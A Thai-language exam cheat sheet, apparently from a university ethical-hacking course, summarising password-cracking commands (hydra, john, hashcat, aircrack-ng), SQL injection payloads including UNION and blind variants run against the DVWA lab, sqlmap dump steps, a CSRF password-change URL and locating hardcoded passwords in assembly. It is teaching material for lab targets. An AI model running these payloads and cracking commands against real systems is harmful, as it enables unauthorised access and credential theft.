ประเภทการโจมตี
  • Passive Online: ดักฟัง traffic — Wire Sniffing, MitM, Replay
  • Active Online: เดารหัสกับเป้าหมายตรงๆ (Brute-force/Guessing) — เสียงดัง ตรวจจับง่าย
  • Offline: นำ hash มาแคร็กบนเครื่องตัวเอง — เร็ว เงียบ (Brute Force / Dictionary / Rainbow Table)
  • Non-electronic: Social Engineering
Wordlist & Tools

sudo gzip -d /usr/share/wordlists/rockyou.txt.gz · สร้างเอง: crunch 4 4 abcdefghijklmnopqrstuvwxyz -o w.txt · crunch 8 8 ... -t %%%%%%-%%%%%%

Hydra = Online brute (FTP/SSH) · John = Offline (หลายแฮช) · Hashcat = Offline command-line (เร็ว, GPU) · Aircrack-ng = WiFi WEP/WPA

คำสั่งหลัก (จำไปสอบ)
  1. hydra -L users.txt -P passwords.txt <Target_IP> ftp → ยืนยันด้วย ftp <IP>
  2. unshadow passwd shadow > hashes.txt รวมไฟล์ก่อนแคร็ก + rm ~/.john/john.pot ล้างผลเก่า
  3. john --format=md5crypt --wordlist=/usr/share/wordlists/rockyou.txt meta_shadow
  4. john --show meta_shadow ดูรหัสที่ถอดได้
  5. hashcat -m 500 -a 0 meta_shadow_cut rockyou.txt --potfile-disable (-m 500=MD5-crypt, -a 0=Dictionary)
  6. aircrack-ng -w rockyou.txt -b <BSSID> wpachallenge*.cap (WPA) · WEP ใช้ -b เดี่ยว

💡 เกร็ด: WEP เจาะได้เพราะ IV สั้น+คีย์คงที่ → IV ซ้ำ · ก่อนใช้ hashcat/john ต้องรู้ชนิดแฮช (ดู prefix) ไม่งั้น -m ผิด = ไม่เจอ · Assignment: แคร็ก shadow 5 รายการ (DES/MD5/SHA-256/SHA-512) แนบภาพ john --show

SQL Injection — หลักการ

แทรกคำสั่ง SQL เข้า query ของแอป → ดู/แก้/ลบ data ที่ไม่มีสิทธิ์ · Escape chars: ' " ` ) ') แล้วปิดด้วย comment

MySQL# · -- (มี space) · /* */
PostgreSQL / MSSQL / SQLite-- · /* */

พิสูจน์ว่ามีช่องโหว่: Peter' or '1'='1 ให้ผลเหมือน Peter · หรือคณิตศาสตร์ ?id=2-1 = ?id=1 → ได้ทุกแถว (tautology)

DVWA Low: %' or '0'='0 → SELECT first_name, last_name FROM users WHERE user_id = '%' or '0'='0'; · ' or 1=1#

UNION-based Injection

UNION รวมผล 2 query — ต้องได้จำนวนคอลัมน์เท่ากัน · นับคอลัมน์: ไล่ ORDER BY X# จน error หรือเติม null: 1' UNION SELECT null,null --

  1. %' UNION SELECT table_name,column_name FROM information_schema.columns # — ดู schema ทั้งหมด
  2. ' union select table_name,null from information_schema.tables# — รายชื่อตาราง
  3. %' UNION SELECT user, password FROM users # — ได้ MD5 hash: admin:5f4dcc3b... → เอาไปแคร็กต่อ (L7)
Error-based & Blind
  • Error-based: ไม่เห็น output แต่เห็น error → บังคับ error ที่ฝัง data (row()/count()/concat + floor(rand()*2)) ให้ข้อมูลโผล่ในข้อความ error
  • Boolean blind: 2' AND 1=1# (จริง) vs 2' AND 1=0# (เท็จ) — page เปลี่ยนตาม
  • Timing blind: 2' AND SLEEP(5)# — หน้าค้าง 5 วิ = คำสั่งรันจริง
  • หาคอลัมน์: 2' ORDER BY X# จน behavior เปลี่ยน (X=3 error → มี 2 คอลัมน์) · หาความยาว DB: 2' AND LENGTH(DATABASE())=X#
sqlmap — Automate

รองรับ 6 เทคนิค (boolean/time blind, error, UNION, stacked, out-of-band) · enumerate users/hashes/privileges/DBs/tables/columns · เอา PHPSESSID จาก DevTools F12 → Application/Storage → Cookies

sqlmap -u "http://<IP>/dvwa/...?id=1&Submit=Submit#" --cookie="security=medium;PHPSESSID=<id>" · POST เพิ่ม --data="id=1&Submit=Submit" -p id · --dbs → -D dvwa --tables → -D dvwa -T users --columns → -D dvwa -T users --dump

💡 เกร็ด: ผล sqlmap เก็บที่ ~/.local/share/sqlmap/output/<IP> เปิด session.sqlite ด้วย sqlitebrowser · ค่า security= ใน cookie ต้องตรงกับ DVWA level

L8 · Web Hacking (2) — CSRF · XSS · Burp Suiteโจมตีฝั่ง client + เครื่องมือ intercept
CSRF (Cross-Site Request Forgery)

บังคับเบราว์เซอร์เหยื่อยิง request แทนเจ้าตัว (ใช้ session ที่ล็อกอินค้าง) · เงื่อนไข: (1) มี valuable action ให้โจมตี (2) session ผ่าน cookie/Basic Auth (3) ไม่มี unpredictability parameter (token)

DVWA Low: http://<IP>/dvwa/vulnerabilities/csrf/?password_new=kmutnb&password_conf=kmutnb&Change=Change# — GET + ไม่มี token → ล่อให้คลิก = เปลี่ยนรหัสผ่านเหยื่อทันที

Assembly Analysis — หารหัสผ่าน
  1. หา main function (จุดรับ input + ตรวจ credential)
  2. หา input function: scanf / fgets / gets
  3. หาจุดตัดสินใจ: cmp/test + je (เท่ากัน=ถูก) / jne (ไม่เท่า=ผิด)
  4. อ่าน hardcoded credential: ค่าหลัง cmp หรือใน register ก่อนเทียบ
